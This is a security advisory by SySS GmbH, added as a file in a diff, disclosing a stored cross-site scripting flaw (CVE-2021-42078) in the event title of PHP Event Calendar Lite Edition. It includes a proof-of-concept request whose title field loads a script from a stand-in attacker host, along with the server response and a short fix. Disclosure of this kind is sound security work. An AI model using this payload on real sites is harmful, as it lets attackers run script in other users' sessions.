@@ -1,0 +1,129 @@
+id: 37001
+date: 11/05/2021
+title: PHP Event Calendar Lite Edition Cross Site Scripting Vulnerability
+author: Erik Steltzner
+cves: CVE-2021-42078
+
+Product:                   PHP Event Calendar
+Manufacturer:              Kayson Group Ltd.
+Affected Version(s):       PHP Event Calendar Lite edition
+Tested Version(s):         PHP Event Calendar Lite edition
+Vulnerability Type:        Cross-site Scripting (CWE-79)
+Risk Level:                High
+Solution Status:           Open
+Manufacturer Notification: 2021-08-09
+Public Disclosure:         2021-11-04
+CVE Reference:             CVE-2021-42078
+Authors of Advisory:       Erik Steltzner, SySS GmbH
+                            Maurizio Ruchay, SySS GmbH
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+PHP Event Calendar is a multi-user web application designed
+to manage and publish calendar events.
+
+The manufacturer describes the product as follows (see [1] and [2]):
+
+"PHP Event Calendar features day, week, month, year, agenda, and
+resource views. It includes built-in reminder support so you can
+deliver full-featured event scheduling management systems in
+the shortest possible time."
+
+"PHP Event Calendar is a out-of-box web calendar/scheduler solution.
+It will run on web servers that support PHP 5.3 and higher."
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+The title of a calendar event is vulnerable to persistent cross-site 
+scripting (XSS).
+
+For example, the following title causes an event to be stored with a 
+prepared
+JavaScript code. As soon as some user opens the event in the detail 
+view, the
+JavaScript code stored on the attacker server will be executed.
+
+<script src="http://<attacking-machine>/XSS.js"/>
+
+This can be exploited by an adversary in multiple ways. For example, to
+perform actions on the page in the context of other users.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+Adding an event with a malicious title:
+
+~~~
+Request:
+POST /server/ajax/events_manager.php HTTP/1.1
+[...snip...]
+title=%3Cscript+src%3D%22http%3A%2F%2F<attacking-machine>%2FXSS.js%22%2F%3E&start-date=<startDate>
+&start-time=<startTime>&end-date=<endDate>&end-time=<endTime>&location=&url=&description=
+&selected_calendars%5B%5D=1&backgroundColor=%233a87ad&imageName=&free_busy=free
+&privacy=public&update-event=&currentView=
+
+Response:
+HTTP/1.1 200 OK
+[...snip...]
+~~~
+
+When a victim opens the event in the detail view, the following request
+loads the malicious code:
+
+~~~
+Request:
+POST /server/ajax/events_manager.php HTTP/1.1
+[...snip...]
+eventID=11&action=LOAD_SINGLE_EVENT_BASED_ON_EVENT_ID_PUBLIC
+
+Response:
+HTTP/1.1 200 OK
+[...snip...]
+{
+      "id":"11",
+      [...snip...]
+      "title":"<script src=\"http:\/\/<attacking-machine>\/XSS.js\"\/>",
+      "description":"",
+      [...snip...]
+}
+~~~
+
+As soon as the victim's browser renders this response, the malicious
+script "XSS.js" is loaded and executed.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+To prevent cross-site scripting attacks, all user-provided input should be
+validated, and control characters should be masked in a context-sensitive
+manner.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclosure Timeline:
+
+2021-07-29: Vulnerability discovered
+2021-08-09: Vulnerability reported to manufacturer
+2021-11-04: Public disclosure of vulnerability
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+References:
+
+[1] Product Website for PHP Event Calendar
+      https://phpeventcalendar.com/
+[2] Documentation Website for PHP Event Calendar
+      https://phpeventcalendar.com/documentation/
+[3] SySS Security Advisory SYSS-2021-049
+ 
+https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2021-049.txt
+[4] SySS Responsible Disclosure Policy
+      https://www.syss.de/en/news/responsible-disclosure-policy/
+
+#  0day.today [2023-03-23]  #
